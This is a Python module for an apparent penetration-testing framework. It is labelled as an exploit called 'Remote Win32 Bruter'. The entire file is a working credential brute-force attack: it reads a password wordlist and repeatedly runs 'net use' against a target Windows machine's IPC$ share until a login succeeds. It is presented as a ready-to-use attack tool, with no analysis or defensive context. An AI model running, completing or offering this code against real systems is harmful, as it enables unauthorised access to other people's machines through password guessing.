# MODULE_TYPE specifies the category (exploit, payload, auxiliary, encoder, cracker, postexploit, evade, nop, recon)
MODULE_TYPE = "exploit"
import time,socket,subprocess
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        #self.scan = connScan(target,int(port))
        self.info = {
            'Name': 'Remote Win32 Bruter',
            'Rank':'Good',
            'Platform':'Win32/Windows',
            'Description': 'Attempts to brute force the password for a given username from a file on a remote Windows PC.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Options': OrderedDict([
                ('TARGET', ('', True, 'Target IP')),
                ('PORT', ('', True, 'Target Port')),
                ('name', ('', True, 'Username')),
                ('wordlist',('', True, 'Password List File'))
               
            ])
        }

    def help(self):
        print("Usage: set TARGET <IP> | set PORT | set wordlist <path/to/file>  then run")
    	
    
    def execute(self):
        target_ip = self.info['Options']['TARGET'][0]
        port = self.info['Options']['PORT'][0]
        password_file = self.info['Options']['wordlist'][0]
        username = self.info['Options']['name'][0]
        with open(password_file, "r") as f:
        	password_list = f.readlines()
        	password_list = [password.strip() for password in password_list]
        for password in password_list:
        	command = f"net use \\\\{target_ip}\\ipc$ /user:{username} {password}"
        	result = subprocess.run(command, capture_output=True, text=True)
        	if "The command completed successfully." in result.stdout:
        		print(f"Password found on {target_ip}: {password}")
        		break
        	else:
        		print(f"Password attempt failed on {target_ip}: {password}")
        
        return "[OK] Exploit executed successfully ..."
    